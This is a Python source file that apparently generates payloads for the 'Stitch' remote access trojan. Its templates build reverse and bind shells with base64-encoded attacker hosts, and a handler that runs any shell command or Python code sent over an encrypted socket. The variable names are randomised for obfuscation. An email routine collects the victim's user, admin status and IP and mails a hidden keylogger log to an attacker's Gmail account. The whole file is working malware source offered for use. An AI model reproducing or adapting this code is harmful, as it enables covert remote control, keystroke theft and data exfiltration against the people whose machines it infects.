import sys
from .st_aes import *
from random import randint,choice
from string import ascii_uppercase

st_obf = []
for n in range(0,10):
    st_obf.append(''.join(choice(ascii_uppercase) for i in range(randint(1,5))))

################################################################################
#                       st_main.py stitch_gen variables                        #
################################################################################

main_imports = '''
from st_utils import *

class stitch_payload():

    connected = False
'''

def add_bind_server(BHOST,BPORT):
    return '''
    def bind_server(self):
        client_socket=None
        self.stop_bind_server = False
        # if no target is defined, we listen on all interfaces
        if dbg:
            print('creating server')
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        target = base64.b64decode("{}").decode()
        port = int(base64.b64decode("{}").decode())
        server.bind((target,port))
        server.listen(5)
        while True:
            if self.stop_bind_server:
                break
            server.settimeout(5)
            try:
                client_socket, addr = server.accept()
                server.settimeout(None)
                client_socket.settimeout(None)
            except Exception as e:
                if dbg:
                    print(e)
                client_socket=None
                pass
            if client_socket:
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
                    client_socket.close()
            client_socket=None
        server.close()

    def halt_bind_server(self):
        self.stop_bind_server = True\n\n'''.format(BHOST,BPORT)

def add_listen_server(LHOST,LPORT):
    return '''
    def listen_server(self):
        self.stop_listen_server  = False
        while True:
            if self.stop_listen_server :
                break
            while self.connected:
                sleep(5)
                pass
            if dbg:
                print('trying to connect')
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            client_socket.settimeout(5)
            target = base64.b64decode("{}").decode()
            port = int(base64.b64decode("{}").decode())
            try:
                client_socket.connect((target,port))
                client_socket.settimeout(300)
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
                    client_socket.close()
            except Exception as e:
                if dbg:
                    print(e)
                client_socket.close()
                self.connected = False

    def halt_listen_server(self):
        self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)

def add_win_listen_server(LHOST,LPORT):
    return '''
    def listen_server(self):
        self.stop_listen_server  = False
        while True:
            if self.stop_listen_server :
                break
            while self.connected:
                sleep(5)
                pass
            if dbg:
                print('trying to connect')
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            client_socket.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
            client_socket.settimeout(5)
            target = base64.b64decode("{}").decode()
            port = int(base64.b64decode("{}").decode())
            try:
                client_socket.connect((target,port))
                client_socket.settimeout(300)
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
                    client_socket.close()
            except Exception as e:
                if dbg:
                    print(e)
                client_socket.close()
                self.connected = False

    def halt_listen_server(self):
        self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)

def add_lnx_listen_server(LHOST,LPORT):
    return '''
    def listen_server(self):
        self.stop_listen_server  = False
        while True:
            if self.stop_listen_server :
                break
            while self.connected:
                sleep(5)
                pass
            if dbg:
                print('trying to connect')
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, after_idle_sec)
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, interval_sec)
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, max_fails)
            client_socket.settimeout(5)
            target = base64.b64decode("{}").decode()
            port = int(base64.b64decode("{}").decode())
            try:
                client_socket.connect((target,port))
                client_socket.settimeout(300)
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\\n")
                    client_socket.close()
            except Exception as e:
                if dbg:
                    print(e)
                client_socket.close()

    def halt_listen_server(self):
        self.stop_listen_server = True\n\n'''.format(LHOST,LPORT)


def add_listen_bind_main():
    return'''
def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            bind = threading.Thread(target=st_pyld.bind_server, args=())
            listen = threading.Thread(target=st_pyld.listen_server, args=())
            bind.daemon = True
            listen.daemon = True
            bind.start()
            listen.start()
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            if dbg:
                print(e)
            pass
        st_pyld.halt_bind_server()
        st_pyld.halt_listen_server()

'''

def add_listen_main():
    return '''
def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            listen = threading.Thread(target=st_pyld.listen_server, args=())
            listen.daemon = True
            listen.start()
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            if dbg:
                print(e)
            pass
        st_pyld.halt_listen_server()

'''

def add_bind_main():
    return '''
def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            bind = threading.Thread(target=st_pyld.bind_server, args=())
            bind.daemon = True
            bind.start()
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            if dbg:
                print(e)
            pass
        st_pyld.halt_bind_server()

'''

def add_run_main():
    if sys.platform.startswith('darwin'):
        return '''
class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        st_thread = threading.Thread(target=main)
        st_thread.daemon = True
        st_thread.start()

def osx_main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

if __name__ == '__main__':
    osx_main()
'''
    else:
        return '''
if __name__ == '__main__':
    main()
'''

################################################################################
#                       st_utils.py stitch_gen variables                       #
################################################################################

utils_imports = '''
import os
import re
import sys
import math
import socket
import base64
import shutil
import zipfile
import datetime
import requests
import platform
import threading
import subprocess
from io import StringIO
from st_protocol import *
from st_encryption import *
from mss.exception import ScreenShotError
from time import strftime, sleep
from contextlib import contextmanager\n'''

utils_code = '''

sp = subprocess
N = True
T = False
{3} = send
{6} = sys.platform

def run_command({4}):
    subp = sp.Popen({4},shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    {0}, {5} = subp.communicate()
    if not {5}:
        if {0} == '':
            return "[+] Command successfully executed.\\n"
        else:
            return {0}
    return "[!] {{}}".format({5})

def start_command(command):
    try:
        subp = sp.Popen(command, shell=True,
             stdin=None, stdout=None, stderr=None, close_fds=True)
        return '[+] Command successfully started.\\n'
    except Exception as e:
        return '[!] {{}}\\n'.format(str(e))

def no_error({1}):
    if {1}.startswith("ERROR:") or {1}.startswith("[!]") :
        return T
    else:
        return N

def win_client(system = {6}):
    if system.startswith('win'):
        return N
    else:
        return T

def osx_client(system = {6}):
    if system.startswith('darwin'):
        return N
    else:
        return T

def lnx_client(system = {6}):
    if system.startswith('linux'):
        return N
    else:
        return T

def pyexec({7},client_socket,pylib=False):
    pyerror = None
    response = ''
    if pylib:
        try:
            exec({7})
        except Exception as e:
            {5} = f"[!] PYEXEC(): {{e}}"
            {3}(client_socket,{5})
    else:
        with stdoutIO() as s:
            try:
                exec({7})
            except Exception as e:
                {5} = f"[!] PYEXEC(): {{e}}"
                {3}(client_socket,{5})
        r = s.getvalue()
        {3}(client_socket,r)

def determine_cmd({4},{2}):
    if {4}.strip()[:6] == "pyexec":
        pyexec({4}.strip()[6:],{2})
    elif {4}.strip()[:5] == "pylib":
        pyexec({4}.strip()[5:],{2},pylib=True)
    else:
        output=run_command({4})
        {3}({2},output)

def get_user():
    if win_client():
        user = os.getenv('username')
    else:
        user = run_command('whoami')
    return user.strip()

def get_path():
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    path_name = "[{{}}@{{}}] {{}}>".format(user,hostname,current_dir)
    return path_name

def get_temp():
    if win_client():
        temp = "C:\\\\Windows\\\\Temp\\\\"
    else:
        temp = "/tmp/"
    return temp

def get_desktop():
    user = get_user()
    if win_client():
        {9} = os.path.join(os.getenv('userprofile'),'Desktop')
    elif osx_client():
        {9} = '/Users/{{}}/Desktop'.format(user)
        if not os.path.exists({9}):
            logname = run_command('logname')
            {9} = '/Users/{{}}/Desktop'.format(logname.strip())
    else:
        {9} = '/home/{{}}'.format(user)
    return {9}

def stitch_running():
    {8} = os.getpid()
    {9} = os.path.abspath(sys.argv[0])
    if {9}.endswith('.py') or {9}.endswith('.pyc'):
        {9} = 'python.exe'
    if win_client():
        {7} = base64.b64decode('QzpcVXNlcnNcZ3VhaWRcc3RJbnN0YWxsLmxvZw==').decode()
    else:
        {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=').decode()
    if os.path.exists({7}):
        with open({7},'r') as st:
            data = st.readlines()
            data[0] = str(data[0]).strip()
        if data[0] == {8}:
            if data[1] == {9}:
                return True
        if win_client():
            exists_cmd = 'wmic process where "ProcessID={{}}" get ExecutablePath'.format(data[0])
        else:
            exists_cmd = 'ps -p {{}} -o comm='.format(data[0])
        running = run_command(exists_cmd)
        if running:
            if data[1] in running.strip() or running.strip() in data[1]:
                return True
    with open({7},'w') as st:
        st.write('{{}}\\n{{}}'.format({8},{9}))
    return False

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))

@contextmanager
def stdoutIO(stdout=None):
    prev = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = prev

def client_handler({2}):
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    {8} = get_desktop()
    if os.path.exists({8}):
        os.chdir({8})

    {3}({2},'c3RpdGNoX3NoZWxs',encryption=False)
    {3}({2},abbrev, encryption=False)
    {3}({2},{6})
    {3}({2},user)
    {3}({2},hostname)
    {3}({2},platform.platform())
    cmd_buffer=""

    while N:
        try:
            cmd_buffer = receive({2})
            if not cmd_buffer: break
            if cmd_buffer == "end_connection": break
            determine_cmd(cmd_buffer.decode(),{2})
        except socket.timeout as e:
            print(e)
        except Exception as e:
            if dbg:
                print(e)
            {2}.close()
            break

dbg = False
script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))\n
'''.format(st_obf[0],st_obf[1],st_obf[2],st_obf[3],st_obf[4],st_obf[5],st_obf[6],
            st_obf[7],st_obf[8],st_obf[9])

# windows st_running = 'C:\\Windows\\Temp:stshell.log'
# posix st_running = '/tmp/.stshell.log'
# st_obf[3] = send
# st_obf[4] = arg_list
# st_obf[5] = errors
# st_obf[6] = sys.platform

def win_reg_exists():
    return '''
def reg_exists(path):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
        return True
    except:
        return False\n\n
'''

def win_util_imports():
    return '''
import winreg
import pythoncom
from ctypes import *
import win32clipboard
from mss.windows import MSS
from PIL import Image, ImageFile
'''

def osx_util_imports():
    return '''
import pexpect
import pexpect.pxssh
from mss.darwin import MSS
from PyObjCTools import AppHelper
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from AppKit import NSApplication, NSApp, NSWorkspace\n\n
'''

def lnx_util_imports():
    return '''
import pexpect
import pyxhook
import pexpect.pxssh
from mss.linux import MSS\n
'''

################################################################################
#                       st_encryption.py stitch_gen variables                  #
################################################################################

def get_encryption():
    return '''
import base64
from Crypto import Random
from Crypto.Cipher import AES

abbrev = '{2}'
{0} = base64.b64decode('{1}')

def encrypt(raw):
    if type(raw) is not bytes:
        raw = raw.encode()
    iv = Random.new().read( AES.block_size )
    cipher = AES.new({0}, AES.MODE_CFB, iv )
    return (base64.b64encode( iv + cipher.encrypt( raw ) ) )

def decrypt(enc):
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new({0}, AES.MODE_CFB, iv )
    return cipher.decrypt( enc[16:] )
'''.format(st_obf[0],aes_encoded,aes_abbrev)

################################################################################
#                       st_protocol.py stitch_gen variables                    #
################################################################################

def get_protocol():
    return '''
import socket
import struct
from st_encryption import *

st_eof = base64.b64decode('V2hhdCBpcyB0aGUgbWVhbmluZyBvZiBsaWZl')
st_complete = base64.b64decode('NDI=')

def recvall(sock, count, size=False):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    if size: return buf
    else: return decrypt(buf)

def send(sock, data, encryption=True):
    while data:
        if encryption:
            cmd = encrypt(data[:1024])
        else:
            cmd = data[:1024]
        length = len(cmd)
        sock.sendall(struct.pack('!i', length))
        if type(cmd) is not bytes:
            cmd = cmd.encode()
        sock.sendall(cmd)
        data = data[1024:]
    if encryption:
        eof = encrypt(st_eof)
    else:
        eof = st_eof
    eof_len = len(eof)
    sock.sendall(struct.pack('!i', eof_len))
    sock.sendall(eof)

def receive(sock,silent=False,timeout=True):
    full_response=b''
    while True:
        lengthbuf = recvall(sock, 4, size=True)
        length, = struct.unpack('!i', lengthbuf)
        response = recvall(sock, length)
        if response != st_eof:
            full_response += response
        else:
            break
    return full_response
'''

################################################################################
#                        stitch_gen email implementation                       #
################################################################################

def email_imports():
    return '''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import Encoders
'''

def get_email(user,pwd):
    return '''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import Encoders

hour = int(strftime("%H"))
am_pm = "AM"
if hour > 12:
    hour = str(hour - 12)
    am_pm = "PM"
try:
    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    pass

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
ip =(s.getsockname()[0])
s.close()
if win_client():
    os.chdir(os.path.join(os.getenv('userprofile'),'Desktop'))
    user = os.getenv('username')
    arch = run_command('wmic os get osarchitecture').split('\\n')[1]
else:
    user = run_command("whoami").strip().replace("\\\\","-")
    arch = run_command('uname -m')
    if 'x86_64' in arch:
        arch = '64-bit'
    else:
        arch = '32-bit'
time = "{{}}{{}}{{}}".format(str(hour),strftime(":%M:%S "),am_pm)
date = strftime("%m/%d/%Y")
stinfo = (  "   OS{{8:25}}: {{0}}"
            "\\n   Architecture{{8:13}}: {{1}}"
            "\\n   User{{8:23}}: {{2}}"
            "\\n   Admin Rights{{8:11}}: {{3}}"
            "\\n   Network IP{{8:14}}: {{4}}"
            "\\n   Network Name{{8:9}}: {{5}}\\n"
            "\\n   Date{{8:23}}: {{6}}"
            "\\n   Time{{8:23}}: {{7}}\\n"
).format(platform.platform(),arch,user,str(is_admin),ip,platform.node(),date,time," ")

gmail_user = '{0}'
gmail_pwd = '{1}'

msg =MIMEMultipart()
msg['From'] = '{0}'
msg['To'] = '{0}'
msg['Subject'] = "Hello from {{}}".format(ip)
body = 'This system is now up and running:\\n\\n{{}}'.format(stinfo)

msg.attach(MIMEText(body,'plain'))
filename = "kl.log"
win_kf = 'C:\\Windows\\Temp:stkl.log'
pos_kf = '/tmp/.stkl.log'
if os.path.exists(win_kf):
    attachment = open(win_kf,"rb")
elif os.path.exists(pos_kf):
    attachment = open(pos_kf,"rb")
else:
    attachment = False

if attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= {{}}".format(filename))
    msg.attach(part)

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)

    # identify ourselves, prompting server for supported features
    server.ehlo()

    # If we can encrypt this session, do it
    if server.has_extn('STARTTLS'):
        server.starttls()
        server.ehlo() # re-identify ourselves over TLS connection

    server.login('{0}', '{1}')
    text = msg.as_string()
    server.sendmail(user, '{0}', text)
    server.close()
    with open('suuuup.txt','w') as s:
        s.write('should have finished')
except Exception as e:
    with open('failed.txt', 'w') as s:
        s.write(str(e))
    pass

'''.format(user,pwd)

################################################################################
#                       st_requirments.py stitch_gen variables                 #
################################################################################

def get_requirements():
    return '''
import os
import re
import sys
import math
import time
import socket
import base64
import shutil
import ctypes
import socket
import struct
import zipfile
import datetime
import requests
from io import StringIO
import platform
import threading
import subprocess
from Crypto import Random
from Crypto.Cipher import AES
from mss.exception import ScreenShotError
from time import strftime, sleep
from contextlib import contextmanager
from base64 import b64decode as INFO
from zlib import decompress as SEC

from st_utils import *
from st_protocol import *
from st_encryption import *
'''

